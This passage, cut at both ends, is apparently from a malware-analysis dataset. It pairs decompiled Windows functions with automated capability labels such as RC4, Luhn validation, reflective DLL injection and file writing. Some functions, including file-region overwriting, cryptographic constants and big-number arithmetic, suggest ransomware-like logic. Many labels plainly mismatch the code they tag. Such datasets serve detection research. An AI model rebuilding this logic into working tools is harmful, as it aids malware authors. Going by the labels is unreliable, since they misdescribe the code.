arg_18h;\n                    fcn.00405376();\n                    var_4h = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004056b3, puVar2, 0, 0);\n                    if (var_4h == 0) {\n                        fcn.004053e5();\n                        fcn.0040861b(puVar2[1]);\n                        fcn.004090a1(puVar2[4]);\n                        fcn.004090a1(puVar2);\n                    }\n                }\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 546
    },
    "00405999": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405999(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar5 = in_EAX - param_1;\n    while( true ) {\n        uVar2 = *(iVar5 + param_1);\n        if (uVar2 - 0x41 < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n        uVar1 = *param_1;\n        uVar3 = uVar1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar3 = uVar1 + 0x20;\n        }\n        iVar4 = uVar2 - uVar3;\n        if (iVar4 != 0) break;\n        if (uVar1 == 0) {\n            return 0;\n        }\n        param_1 = param_1 + 1;\n    }\n    if (iVar4 < 0) {\n        iVar4 = -1;\n    }\n    else if (0 < iVar4) {\n        iVar4 = 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 287
    },
    "00405b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00405b7c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = false;\n    iVar1 = fcn.00409041(0x20a);\n    if (iVar1 != 0) {\n        iVar2 = fcn.00405b0e(iVar1);\n        if (iVar2 != 0) {\n            if ((param_2 == 0) && (puVar3 = fcn.00409139(iVar1, 0x2e),  puVar3 != NULL)) {\n                *puVar3 = 0;\n            }\n            iVar4 = fcn.00409139(iVar1, 0x5c);\n            iVar2 = iVar1;\n            if (iVar4 != 0) {\n                iVar2 = iVar4 + 2;\n            }\n            uVar5 = fcn.004090c6(iVar2);\n            bVar6 = uVar5 < 0x105;\n            if (bVar6) {\n                fcn.0040927d(param_1, iVar2);\n            }\n        }\n        fcn.004090a1(iVar1);\n    }\n    return bVar6;\n}\n",
        "token_count": 303
    },
    "00405fe7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405fe7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar1 = fcn.004092e1(arg_8h);\n    if (iVar1 != 0) {\n        iVar2 = fcn.004090c6(iVar1);\n        iVar3 = fcn.00405ec2(arg_8h, iVar2, fcn.0040616c, arg_ch);\n        if (iVar3 == 0) {\n            iVar2 = iVar2 * 2;\n            iVar3 = iVar1;\n            do {\n                iVar1 = fcn.0040907a(iVar3, iVar2 * 2 + 2);\n                if (iVar1 == 0) {\n                    fcn.004090a1(iVar3);\n                    return 0;\n                }\n                iVar4 = fcn.00405ec2(arg_8h, iVar2, fcn.0040616c, arg_ch);\n                iVar2 = iVar2 * 2;\n                iVar3 = iVar1;\n            } while (iVar4 == 0);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 281
    },
    "0040620d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040620d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t arg_10h;\n    int32_t iVar1;\n    int32_t arg_ch_01;\n    \n    arg_ch_00 = fcn.0040930f(arg_8h);\n    if (arg_ch_00 != 0) {\n        arg_10h = fcn.004090b5(arg_ch_00);\n        iVar1 = fcn.00406065(arg_8h, arg_ch_00, arg_10h, arg_ch);\n        while (iVar1 == 0) {\n            arg_10h = arg_10h * 2;\n            arg_ch_01 = fcn.0040907a(arg_ch_00, arg_10h + 1);\n            if (arg_ch_01 == 0) {\n                fcn.004090a1(arg_ch_00);\n                return 0;\n            }\n            iVar1 = fcn.00406065(arg_8h, arg_ch_01, arg_10h, arg_ch);\n            arg_ch_00 = arg_ch_01;\n        }\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 268
    },
    "00406274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406274(void)\n\n{\n    int32_t *unaff_ESI;\n    \n    if (*unaff_ESI != 0) {\n        fcn.004090a1(*unaff_ESI);\n    }\n    if (unaff_ESI[2] != 0) {\n        fcn.004090a1(unaff_ESI[2]);\n    }\n    fcn.00408fa9(unaff_ESI + 4, 0, 0x20);\n    fcn.004090a1();\n    return;\n}\n",
        "token_count": 119
    },
    "00406432": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00406432(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407447(param_1, 1, param_2, param_3);\n    return iVar1 == 0;\n}\n",
        "token_count": 66
    },
    "0040644e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040644e(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407447(param_1, 0, param_2, param_3);\n    return iVar1 == 0;\n}\n",
        "token_count": 67
    },
    "0040752a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040752a(int32_t **arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    \n    if (*arg_8h != NULL) {\n        fcn.004075ef(*arg_8h, unaff_EBP, unaff_retaddr);\n    }\n    iVar2 = fcn.0040905b(1, 0x28);\n    iVar3 = fcn.00408052();\n    *(iVar2 + 8) = iVar3;\n    **(iVar3 + 0xc) = 0;\n    *(*(*(iVar2 + 8) + 0xc) + 2) = 1;\n    fcn.00407928();\n    piVar4 = fcn.0040905b(1, 0x14);\n    *arg_8h = piVar4;\n    piVar4[4] = iVar2;\n    piVar4[3] = arg_10h;\n    iVar3 = fcn.00407e19(arg_ch);\n    *piVar4 = iVar3;\n    uVar1 = *(*(iVar3 + 0xc) + -2 + *(iVar3 + 4) * 2);\n    *(iVar2 + 0xc) = iVar3;\n    fcn.00407928();\n    uVar5 = fcn.00407a8f(iVar2, iVar3, 0x10000 / (uVar1 + 1) & 0xffff);\n    *(iVar2 + 0x10) = uVar5;\n    fcn.00407928();\n    iVar2 = fcn.00407e19(arg_14h);\n    piVar4[1] = iVar2;\n    fcn.00407928();\n    return;\n}\n",
        "token_count": 448
    },
    "00407753": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407753(void)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint var_70h;\n    int32_t var_30h;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_30h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0x6a09e667;\n    var_1ch = 0xbb67ae85;\n    var_18h = 0x3c6ef372;\n    var_14h = 0xa54ff53a;\n    var_10h = 0x510e527f;\n    var_ch = 0x9b05688c;\n    var_8h = 0x1f83d9ab;\n    var_4h = 0x5be0cd19;\n    uVar1 = 0;\n    do {\n        *(&var_70h + var_30h) = *(uVar1 + 0x40d680);\n        var_30h = var_30h + 1;\n        if (var_30h == 0x40) {\n            fcn.004082ee();\n            bVar2 = 0xfffffdff < var_28h;\n            var_28h = var_28h + 0x200;\n            var_30h = 0;\n            var_24h = var_24h + bVar2;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x20);\n    fcn.0040848a();\n    return;\n}\n",
        "token_count": 425
    },
    "0040797a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040797a(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    int16_t *piVar5;\n    uint16_t uVar6;\n    int32_t var_4h;\n    \n    uVar6 = 0;\n    iVar1 = *(arg_ch + 4);\n    if (*(arg_ch + 4) <= *(arg_10h + 4)) {\n        iVar1 = *(arg_10h + 4);\n    }\n    var_4h = iVar1;\n    fcn.00408008();\n    fcn.00408008();\n    puVar3 = *(arg_ch + 0xc);\n    piVar5 = *(arg_10h + 0xc);\n    do {\n        uVar4 = *piVar5 + *puVar3;\n        uVar2 = uVar4 + uVar6;\n        piVar5 = piVar5 + 1;\n        uVar6 = uVar4 < *puVar3 || uVar2 < uVar4;\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    *puVar3 = uVar6;\n    fcn.00407951();\n    fcn.004080e3();\n    return;\n}\n",
        "token_count": 342
    },
    "00407e85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e85(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t iVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = in_EAX + -1;\n    fcn.00408fa9(arg_ch, 0);\n    iVar2 = 0;\n    if (0 < *(unaff_ESI + 4)) {\n        do {\n            uVar1 = 0;\n            var_4h = 0;\n            do {\n                *(iVar3 + arg_ch) = (*(*(unaff_ESI + 0xc) + iVar2 * 2) & 0xff << (var_4h & 0x1f)) >> ((uVar1 & 3) << 3);\n                iVar3 = iVar3 + -1;\n                if (iVar3 < 0) goto code_r0x00407eed;\n                var_4h = var_4h + 8;\n                uVar1 = uVar1 + 1;\n            } while (var_4h < 0x10);\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(unaff_ESI + 4));\n    }\ncode_r0x00407eed:\n    fcn.00407951();\n    return;\n}\n",
        "token_count": 323
    },
    "00408008": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408008(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (*(unaff_ESI + 6) < unaff_EDI) {\n        iVar2 = *(unaff_ESI + 6) * 2;\n        if (iVar2 <= unaff_EDI) {\n            iVar2 = unaff_EDI;\n        }\n        *(unaff_ESI + 6) = iVar2;\n        uVar1 = fcn.0040907a(*(unaff_ESI + 0xc), iVar2 * 2);\n        *(unaff_ESI + 0xc) = uVar1;\n    }\n    iVar2 = *(unaff_ESI + 4);\n    if (iVar2 < unaff_EDI) {\n        fcn.00408fa9(*(unaff_ESI + 0xc) + iVar2 * 2, 0, (unaff_EDI - iVar2) * 2);\n    }\n    *(unaff_ESI + 4) = unaff_EDI;\n    return;\n}\n",
        "token_count": 249
    },
    "004080a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004080a8(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    \n    uVar1 = param_2 & 0x8000000f;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffff0) + 1;\n    }\n    uVar2 = 1;\n    uVar3 = 1;\n    if (0 < uVar1) {\n        do {\n            uVar2 = uVar3 * 2;\n            uVar1 = uVar1 - 1;\n            uVar3 = uVar2;\n        } while (uVar1 != 0);\n    }\n    return (uVar2 & *(*(param_1 + 0xc) + (param_2 + (param_2 >> 0x1f & 0xfU) >> 4) * 2)) != 0;\n}\n",
        "token_count": 232
    },
    "00408601": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408601(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409139(param_1, 0x5c);\n    if (iVar1 != 0) {\n        return iVar1 + 2;\n    }\n    return param_1;\n}\n",
        "token_count": 73
    },
    "0040861b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040861b(uint param_1)\n\n{\n    uint uVar1;\n    \n    fcn.00408fa9(param_1, 0, 0xa4);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 86
    },
    "00408633": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408633(uint param_1, uint param_2)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    \n    arg_8h = fcn.00409041(0xa4);\n    if (arg_8h != 0) {\n        fcn.00408fd7(arg_8h, param_1, 0x20);\n        fcn.00408fd7(arg_8h + 0x20, param_2, 0x80);\n        uVar1 = fcn.004085d9(0x20);\n        *(arg_8h + 0xa0) = uVar1;\n        uVar1 = fcn.004085d9(0x80);\n        *(arg_8h + 0xa0) = uVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 193
    },
    "00408af1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408af1(uint hFile, uint lpBuffer)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t iVar2;\n    uint dwMoveMethod;\n    uint var_ch;\n    int32_t lpNumberOfBytesWritten;\n    \n    iVar2 = 3;\n    fcn.00408fa9(lpBuffer, 0, 0x40000);\n    do {\n        var_ch = *(unaff_EBX + -4 + iVar2 * 8);\n        iVar2 = iVar2 + -1;\n        dwMoveMethod = *(unaff_EBX + iVar2 * 8);\n        iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, dwMoveMethod, var_ch, &dwMoveMethod, 0);\n        if (iVar1 == 0) goto code_r0x00408b55;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, lpBuffer, 0x40000, &lpNumberOfBytesWritten, 0);\n        if ((iVar1 == 0) || (lpNumberOfBytesWritten != 0x40000)) goto code_r0x00408b55;\n    } while (iVar2 != 0);\n    iVar2 = -1;\ncode_r0x00408b55:\n    return iVar2 == 0;\n}\n",
        "token_count": 297
    },
    "004090c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004090c6(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return (piVar2 - param_1 >> 1) + -1;\n}\n",
        "token_count": 99
    },
    "004090dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.004090dd(uint16_t *param_1, uint16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = *param_2;\n    iVar1 = *param_1 - uVar2;\n    if (iVar1 == 0) {\n        iVar3 = param_1 - param_2;\n        do {\n            if (uVar2 == 0) break;\n            param_2 = param_2 + 1;\n            uVar2 = *param_2;\n            iVar1 = *(iVar3 + param_2) - uVar2;\n        } while (iVar1 == 0);\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 202
    },
    "00409116": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.00409116(int16_t *param_1, int16_t param_2)\n\n{\n    while( true ) {\n        if (*param_1 == 0) {\n            if (*param_1 != param_2) {\n                param_1 = NULL;\n            }\n            return param_1;\n        }\n        if (*param_1 == param_2) break;\n        param_1 = param_1 + 1;\n    }\n    return param_1;\n}\n",
        "token_count": 107
    },
    "0040927d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040927d(int32_t param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1 - param_2;\n    do {\n        iVar1 = *param_2;\n        *(iVar2 + param_2) = iVar1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return param_1;\n}\n",
        "token_count": 108
    },
    "004092e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004092e1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_1 != 0) {\n        iVar1 = fcn.004090c6(param_1);\n        iVar1 = fcn.0040905b(iVar1 + 1, 2);\n        if (iVar1 != 0) {\n            uVar2 = fcn.0040927d(iVar1, param_1);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 124
    },
    "004094d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004094d9(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00409344(param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 47
    },
    "00404d68": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d68(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpExitCode;\n    \n    lpExitCode = 0;\n    iVar1 = fcn.0040930f(arg_8h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00404b85, iVar1, 0, 0),  iVar1 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar1, 0);\n        if (iVar2 == 0) {\n            lpExitCode = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(iVar1, &lpExitCode);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return lpExitCode;\n}\n",
        "token_count": 204
    },
    "00405376": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t fcn.00405376(void)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    puVar1 = in_EAX + 4;\n    do {\n        (*pcVar2)(puVar1);\n        pcVar3 = _sym.imp.KERNEL32.dll_ResetEvent;\n        if (*in_EAX < in_EAX[1]) {\n            if (*in_EAX == 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_ResetEvent)(in_EAX[3]);\n                if (iVar4 == 0) break;\n            }\n            *in_EAX = *in_EAX + 1;\n            if (in_EAX[1] < *in_EAX || in_EAX[1] == *in_EAX) {\n                iVar4 = (*pcVar3)(in_EAX[2]);\n                if (iVar4 == 0) break;\n            }\n            uVar5 = in_EAX[1] <= *in_EAX;\n            goto code_r0x004053d8;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(in_EAX[2], 0xffffffff);\n    } while (iVar4 == 0);\n    uVar5 = 0xffffffff;\ncode_r0x004053d8:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return uVar5;\n}\n",
        "token_count": 372
    },
    "0040542b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040542b(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(in_EAX + 0xc), 0xffffffff);\n    if (iVar1 != 0) {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 101
    },
    "004032ff": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t * fcn.004032ff(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    piVar2 = fcn.00409041(0x38);\n    if (piVar2 != NULL) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(piVar2 + 3, 4000);\n        if (iVar3 == 0) {\n            fcn.004090a1(piVar2);\n        }\n        else {\n            piVar2[0xd] = 0x10000;\n            piVar2[0xc] = 0x100000;\n            piVar2[0xb] = 0;\n            puVar4 = fcn.00409041(0x18);\n            if (puVar4 != NULL) {\n                *puVar4 = 0;\n                puVar4[1] = 0;\n                puVar4[2] = 0;\n                puVar4[3] = 0;\n                puVar4[4] = 0;\n                puVar4[5] = 0;\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_CreateEventW;\n            piVar2[9] = puVar4;\n            piVar2[10] = 4;\n            iVar3 = (*pcVar1)(0, 1, 1, 0);\n            *piVar2 = iVar3;\n            iVar3 = (*pcVar1)(0, 1, 1, 0);\n            piVar2[1] = iVar3;\n            iVar3 = (*pcVar1)(0, 1, 1, 0);\n            piVar2[2] = iVar3;\n            if (((piVar2[9] == 0) || (*piVar2 == 0)) || (piVar2[1] == 0)) {\n                fcn.004032a6();\n                piVar2 = NULL;\n            }\n            iVar3 = fcn.004031c3();\n            if (iVar3 != 0) {\n                return piVar2;\n            }\n            fcn.004032a6();\n        }\n        piVar2 = NULL;\n    }\n    return piVar2;\n}\n",
        "token_count": 502
    },
    "004024c2": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004024c2(uint lpStartAddress, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = fcn.00409041(0x14);\n    if (puVar1 != NULL) {\n        puVar1[2] = arg_14h;\n        *puVar1 = arg_ch;\n        puVar1[1] = arg_10h;\n        puVar1[3] = arg_18h;\n        puVar1[4] = arg_1ch;\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, lpStartAddress, puVar1, 0, 0);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "004033c5": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.004033c5(void)\n\n{\n    code *pcVar1;\n    uint *unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(unaff_ESI + 3);\n    pcVar1 = _sym.imp.KERNEL32.dll_SetEvent;\n    unaff_ESI[10] = unaff_ESI[10] | 1;\n    (*pcVar1)(unaff_ESI[1]);\n    (*pcVar1)(*unaff_ESI);\n    (*pcVar1)(unaff_ESI[2]);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 3);\n    return;\n}\n",
        "token_count": 145
    },
    "00407fb9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00407fb9(int32_t param_1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    \n    iVar1 = *(param_1 + 4);\n    if (*(in_EAX + 4) < iVar1) {\n        return 1;\n    }\n    if (*(in_EAX + 4) <= iVar1) {\n        iVar4 = iVar1 + -1;\n        puVar5 = *(param_1 + 0xc) + iVar4 * 2;\n        while( true ) {\n            uVar2 = *puVar5;\n            uVar3 = *((*(in_EAX + 0xc) - *(param_1 + 0xc)) + puVar5);\n            if (uVar2 >= uVar3 && uVar2 != uVar3) {\n                return 1;\n            }\n            if (uVar2 < uVar3) break;\n            puVar5 = puVar5 + -1;\n            iVar4 = iVar4 + -1;\n            if (iVar4 < 0) {\n                return 0;\n            }\n        }\n        return 0xffffffff;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 289
    },
    "00403c7a": {
        "rules": [
            "get disk information"
        ],
        "decompiled_code": "\nuint fcn.00403c7a(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_8h = fcn.00403bb3(0x17);\n    uVar1 = fcn.004090c6(arg_8h, &var_4h, 0, 0, 0, 0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)(arg_8h, 0, uVar1);\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    fcn.004039da(arg_8h);\n    return var_4h;\n}\n",
        "token_count": 173
    },
    "004078fe": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004078fe(void)\n\n{\n    int32_t *piVar1;\n    int32_t unaff_EBX;\n    int32_t *piVar2;\n    \n    piVar2 = *(unaff_EBX + 4);\n    if (piVar2 != NULL) {\n        do {\n            piVar1 = *piVar2;\n            fcn.004090a1(piVar2[3]);\n            fcn.004090a1(piVar2);\n            piVar2 = piVar1;\n        } while (piVar1 != NULL);\n        *(unaff_EBX + 0x20) = 0;\n        *(unaff_EBX + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00408ffc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * fcn.00408ffc(uchar *param_1, uchar *param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    \n    if ((param_2 < param_1) && (puVar2 = param_2 + param_3,  param_1 < puVar2)) {\n        puVar1 = param_1 + param_3 + -1;\n        if (param_3 != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                *puVar1 = *puVar2;\n                puVar1 = puVar1 + -1;\n                param_3 = param_3 + -1;\n            } while (param_3 != 0);\n        }\n    }\n    else if (param_3 != 0) {\n        iVar3 = param_1 - param_2;\n        do {\n            param_2[iVar3] = *param_2;\n            param_2 = param_2 + 1;\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n    }\n    return param_1;\n}\n",
        "token_count": 263
    },
    "004090b5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.004090b5(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    return pcVar2 + (-1 - param_1);\n}\n",
        "token_count": 90
    },
    "0040929b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040929b(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1 - param_2;\n    do {\n        cVar1 = *param_2;\n        param_2[iVar2] = cVar1;\n        param_2 = param_2 + 1;\n    } while (cVar1 != '\\0');\n    return param_1;\n}\n",
        "token_count": 106
    },
    "null": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid entry0(void)\n\n{\n    code *pcVar1;\n    \n    fcn.004029f5();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 59
    },
    "00407951": {
        "rules": [
            "terminate process"
        ],
